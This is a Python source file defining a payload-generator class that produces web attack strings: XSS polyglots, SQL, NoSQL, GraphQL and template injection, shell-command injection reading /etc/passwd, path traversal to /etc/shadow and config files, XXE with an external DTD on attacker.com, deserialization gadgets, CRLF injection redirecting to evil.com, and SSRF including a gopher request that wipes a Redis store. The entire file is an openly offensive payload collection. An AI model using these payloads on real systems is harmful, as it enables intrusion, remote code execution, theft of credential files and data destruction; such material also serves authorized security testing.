import base64
import urllib.parse
import random
import string

class AdvancedPayloadGenerator:
    @staticmethod
    def generate_xss_polyglots():
        return [
            r"jaVasCript:/*-/*\\`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            "'>><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)>",
            "<script/src=data:,alert()>",
            "\"autofocus/onfocus=alert(1)//\"autofocus/onfocus=alert(2)//\"autofocus/onfocus=alert(3)//",
        ]

    @staticmethod
    def generate_sqli_payloads():
        return [
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))foo) AND 'a'='a",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))foo) AND 'a'='a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        ]

    @staticmethod
    def generate_rce_payloads():
        commands = ['id', 'whoami', 'uname -a', 'cat /etc/passwd']
        wrappers = [
            '$({})',
            '`{}`',
            ';{}',
            '|{}',
            '||{}',
            '&&{}',
            '%0a{}'
        ]
        
        payloads = []
        for cmd in commands:
            for wrapper in wrappers:
                payloads.append(wrapper.format(cmd))
        return payloads

    @staticmethod
    def generate_lfi_payloads():
        files = ['/etc/passwd', '/etc/shadow', '/etc/hosts', 'web.config', 'wp-config.php']
        traversals = [
            '../' * i for i in range(1, 8)
        ]
        wrappers = ['', '%2e%2e%2f', '....//']
        
        payloads = []
        for file in files:
            for traversal in traversals:
                for wrapper in wrappers:
                    payloads.append(f"{wrapper}{traversal}{file}")
        return payloads

    @staticmethod
    def encode_payload(payload, encodings=None):
        if encodings is None:
            encodings = ['url', 'base64', 'hex']
            
        result = payload
        for encoding in encodings:
            if encoding == 'url':
                result = urllib.parse.quote(result)
            elif encoding == 'base64':
                result = base64.b64encode(result.encode()).decode()
            elif encoding == 'hex':
                result = result.encode().hex()
        return result 

    @staticmethod
    def generate_nosql_injection():
        return [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$where": "sleep(5000)"}',
            '{"$regex": ".*"}',
            '{"$exists": true}',
            '{"$in": []}',
            '{"username": {"$regex": "admin", "$options": "i"}}',
            '{"$or": [{}, {"injection": true}]}',
        ]

    @staticmethod
    def generate_template_injection():
        return [
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{7*7}}",
            "${@java.lang.Runtime@getRuntime().exec('id')}",
            "{{config.items()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('calc')}",
        ]

    @staticmethod
    def generate_xxe_payloads():
        return [
            """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>""",
            """<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>""",
            """<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><data>&exploit;</data>""",
            """<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><r>&data;</r>""",
        ]

    @staticmethod
    def generate_deserialization_payloads():
        return [
            # Java
            'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb21wYXJhdG9ycy5UcmFuc2Zvcm1pbmdDb21wYXJhdG9yL5o8PCBDBbsCAAJMAA9kZWNvcmF0ZWRDb21wYXJhdG9ycQB+AAFMAAtzdHJpbmdUb0NoYXJxAH4AAXhw',
            # PHP
            'O:8:"stdClass":1:{s:4:"pipe";O:8:"stdClass":2:{s:4:"type";s:1:"r";s:5:"slave";O:8:"stdClass":2:{s:4:"type";s:1:"w";s:5:"child";O:8:"stdClass":2:{s:3:"cmd";s:2:"id";s:4:"pipe";O:8:"stdClass":2:{s:4:"type";s:1:"w";s:5:"child";N;}}}}}',
            # Python
            'cposix\nsystem\np0\n(S\'id\'\ntR.',
        ]

    @staticmethod
    def generate_graphql_injection():
        return [
            '{"query": "{ __schema { types { name fields { name } } } }"}',
            '{"query": "mutation { __schema { types { name } } }"}',
            '{"query": "{ user(id: 1) { id name email password } }"}',
            '{"query": "{ user(id: 1) { ...FragmentName } } fragment FragmentName on User { id name email password }"}',
        ]

    @staticmethod
    def generate_crlf_injection():
        return [
            '%0D%0ASet-Cookie: sessionid=INJECT',
            '%0D%0ALocation: http://evil.com',
            '%E5%98%8D%E5%98%8ASet-Cookie: sessionid=INJECT',
            '%0D%0A%20Set-Cookie: sessionid=INJECT',
            '%3F%0D%0ASet-Cookie: sessionid=INJECT',
        ]

    @staticmethod
    def generate_advanced_ssrf():
        return [
            'http://127.0.0.1:80',
            'http://127.0.0.1:22',
            'http://localhost:80',
            'http://[::]:80/',
            'http://[0:0:0:0:0:ffff:127.0.0.1]',
            'file:///etc/passwd',
            'dict://127.0.0.1:11211/',
            'gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20mykey%20%22myvalue%22%0D%0AQUIT',
        ] 